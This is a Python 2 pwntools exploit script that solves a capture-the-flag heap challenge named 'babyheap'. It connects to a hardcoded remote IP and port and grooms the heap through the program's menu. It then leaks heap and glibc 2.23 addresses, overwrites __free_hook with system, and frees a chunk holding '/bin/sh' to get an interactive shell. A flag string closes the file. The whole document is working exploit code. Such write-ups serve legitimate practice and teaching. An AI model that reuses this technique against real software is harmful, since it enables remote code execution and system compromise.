#!/usr/bin/env python2

from pwn import *

###

# we get libc from the previous challenge
# libc is Ubuntu xenial 16.04.02 libc 2.23
if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc.so.6')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('babyheap')
context.bits = 64
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

###

if DEBUG:
    r = process('./babyheap', aslr=False)
else:
    r = remote('13.124.157.141', 31337)

def menu():
    global r
    return r.recvuntil('>')

def create_team(desc):
    global r
    r.sendline('1')
    r.recvuntil('length :')
    r.sendline(str(len(desc)))
    r.recvuntil('Description :')
    r.send(desc)
    return menu()

def list_team():
    global r
    r.sendline('4')
    d = r.recvuntil('1. Create')
    menu()
    return d[:-10]

def edit_team(idx):
    global r
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(idx))
    return menu()

def add_members(count, name, desc, b = False):
    global r, DEBUG
    r.sendline('1')
    r.recvuntil('employment :')
    r.sendline(str(count))
    if b:
        return menu()
    for i in xrange(count):
        r.send('A' * 0x64 + 'B' * 0x64)
    if not DEBUG:
        time.sleep(5)
    else:
        time.sleep(1)
    r.clean()
    return

def return_edit():
    global r
    r.sendline('5')
    return menu()

def delete_member(idx, b = False):
    global r
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(idx))
    if b:
        return
    return menu()

def update_member(idx, desc):
    global r
    r.sendline('4')
    r.recvuntil('Index :')
    r.sendline(str(idx))
    r.recvuntil('Description :')
    r.send(desc)
    return menu()

def list_members():
    global r
    r.sendline('3')
    time.sleep(1) # connection so slow...
    d = r.recv(4096)
    return d

GDB = True
if DEBUG and GDB:
    baseaddr = 0x0000555555554000
    bps = [ 0xDB2, 0xD80, 0xC72 ]
    breakpoints = ''
    for x in bps:
        breakpoints += 'b *%#x\n' % (baseaddr + x)
    gdb.attach(r, breakpoints)

menu()
create_team('toto\n')
edit_team(0)
add_members(254, 'AAAA', 'BBBB')
add_members(2, 'CCCC', 'DDDD', True)

# leaking heap
d = list_members()
m = re.findall('Memebr 1.*?Description : ([^\n]+)', d, re.DOTALL)
pos = m[0].find('Mem')
leak = u64(m[0][:pos].ljust(8, '\x00'))
baseheap = leak - 0xd6a0
log.info('leak: %#x' % leak)
log.info('baseheap: %#x' % baseheap)
r.sendline('')
time.sleep(0.5)
r.clean()

# leaking libc
update_member(0, 'A' * 32)
d = list_members()
m = re.findall('Memebr 1.*?Description : ([^\n]+)', d, re.DOTALL)
pos = m[0].find('Mem')
libcleak = u64(m[0][32:pos].ljust(8, '\x00'))
if DEBUG:
    libcbase = libcleak - 0x3a5688
else:
    libcbase = libcleak - 0x3c4b88
freehook = libcbase + libc.symbols['__free_hook']
system = libcbase + libc.symbols['system']
log.info('libcleak: %#x' % libcleak)
log.info('libcbase: %#x' % libcbase)
log.info('freehook: %#x' % freehook)
log.info('system: %#x' % system)

time.sleep(2)
if DEBUG:
    r.sendline('')
    r.sendline('')
    r.clean()
update_member(0, p64(leak) + p64(0) + p64(baseheap + 0x40) * 2) # restore heap correctly

# now replacing __free_hook by system
return_edit()
# we want p to be rounded to malloc(0x800) since the realloc block who was freed previously
# is 0x800 and we can do operations on the pointer array
p  = p64(freehook) # we can write to that pointer
p += p64(baseheap + 0x60) # points toward /bin/sh
p += '/bin/sh\x00'
p += 'A' * (0x7f8 - len(p))
create_team(p)
edit_team(0)
update_member(0, p64(system))

# now we should trigger the exploit
delete_member(1, True)

r.interactive()
r.close()

# SECU[L3t's_start_ctf!~!]
